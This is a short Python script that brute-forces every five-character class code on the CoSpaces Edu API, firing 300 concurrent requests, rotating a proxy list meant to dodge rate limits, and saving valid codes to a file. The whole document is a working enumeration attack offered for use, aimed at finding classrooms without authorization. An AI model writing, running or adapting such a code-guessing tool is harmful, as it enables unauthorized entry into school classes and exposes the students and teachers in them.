import itertools
import string
import aiohttp
import asyncio
import random
async def check(code, proxy):
    async with aiohttp.ClientSession() as session:

        async with session.get(
            f'https://edu.cospaces.io/api/v2/edu/class-codes/{code}/check',
        ) as response:
            if response.status == 200:
                with open('valid.txt', 'a') as f:
                    f.write(f'{code}\n')
                print(f'HIT | {code} is valid')

def nth_code(n):
    alphabet = string.ascii_lowercase + string.digits
    base = len(alphabet)
    result = []

    for _ in range(5):
        index = n % base
        result.append(alphabet[index])
        n //= base

    return ''.join(reversed(result))

async def main(threads):
    with open('proxies.txt') as f:
        proxies = f.read().splitlines()
    tasks = []
    total_combinations = 36 ** 5
    last_print = 0
    i = 1
    while i < total_combinations:
        proxy = random.choice(proxies)
        code = nth_code(i)
        tasks.append(check(code, proxy))
        if len(tasks) >= threads:
            await asyncio.gather(*tasks)
            tasks = []
        i += 1
        if last_print + 1000 <= i:
            print(f'{i}/{total_combinations}')
            last_print = i
    if tasks:
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    threads = 300
    asyncio.run(main(threads))